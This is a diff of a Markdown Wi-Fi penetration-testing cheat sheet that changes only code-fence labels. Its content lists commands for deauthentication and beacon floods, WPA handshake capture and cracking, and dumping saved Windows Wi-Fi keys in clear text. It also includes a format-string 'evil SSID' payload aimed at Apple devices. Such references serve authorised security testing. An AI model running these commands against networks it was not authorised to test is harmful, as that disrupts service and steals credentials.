@@ -31,20 +31,20 @@
 
 ## Aircrack-ng
 
-```c
+```console
 $ tshark -F pcap -r <FILE>.pcapng -w <FILE>.pcap
 $ aircrack-ng -w /usr/share/wordlists/rockyou.txt <FILE>.pcap
 ```
 
 ## airodump-ng
 
-```c
+```console
 $ sudo airodump-ng <INTERFACE>mon
 ```
 
 ## airmon-ng
 
-```c
+```console
 $ sudo airmon-ng check kill
 $ sudo airmon-ng start <INTERFACE>
 $ sudo airmon-ng stop <INTERFACE>
@@ -52,19 +52,19 @@ $ sudo airmon-ng stop <INTERFACE>
 
 ## ALFA AWUS036ACH
 
-```c
+```console
 $ sudo apt-get install realtek-rtl88xxau-dkms
 ```
 
 ## Apple Wi-Fi Evil SSID
 
-```c
+```console
 %p%s%s%s%s%n
 ```
 
 ## iw
 
-```c
+```console
 $ iwconfig
 $ iw <INTERFACE> scan
 ```
@@ -73,7 +73,7 @@ $ iw <INTERFACE> scan
 
 > https://github.com/charlesxsh/mdk3-master
 
-```c
+```console
 $ sudo mdk3 <INTERFACE>mon d -c <CHANNEL_NUMBER>
 $ sudo mdk3 <INTERFACE>mon d <BSSID>
 $ sudo mdk3 <INTERFACE>mon b <BSSID>
@@ -85,40 +85,40 @@ $ sudo mdk3 <INTERFACE>mon b <BSSID>
 
 #### List Profiles
 
-```c
+```console
 PS C:\> netsh wlan show profiles
 ```
 
 #### Extract Passwords
 
-```c
+```console
 PS C:\> netsh wlan show profile name="<PROFILE>" key=clear
 ```
 
 #### Export Profiles
 
-```c
+```console
 PS C:\> netsh wlan export profile name="<PROFILE>" folder=C:\temp
 ```
 
 ## Wi-Fi Example Attack
 
-```c
+```console
 $ sudo airmon-ng check kill
 $ sudo airmon-ng start wlan0
 $ sudo airodump-ng wlan0mon
 $ sudo airodump-ng -w <FILE> -c <CHANNEL> --bssid <BSSID> wlan0mon
 ```
 
-```c
+```console
 $ sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
 ```
 
-```c
+```console
 $ aircrack-ng <FILE>.cap -w /usr/share/wordlists/rockyou.txt
 ```
 
-```c
+```console
 $ sudo airmon-ng stop wlan0mon
 ```
 
@@ -126,7 +126,7 @@ $ sudo airmon-ng stop wlan0mon
 
 ### wpa_supplicant.conf
 
-```c
+```console
 $ echo 'ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
 update_config=1
 
@@ -136,14 +136,14 @@ network={
 }' > /etc/wpa_supplicant.conf
 ```
 
-```c
+```console
 $ wpa_supplicant -B -D wext -i <INTERFACE> -c /etc/wpa_supplicant.conf
 ```
 
-```c
+```console
 $ ip link set <INTERFACE> up
 ```
 
-```c
+```console
 $ dhclient -h
 ```
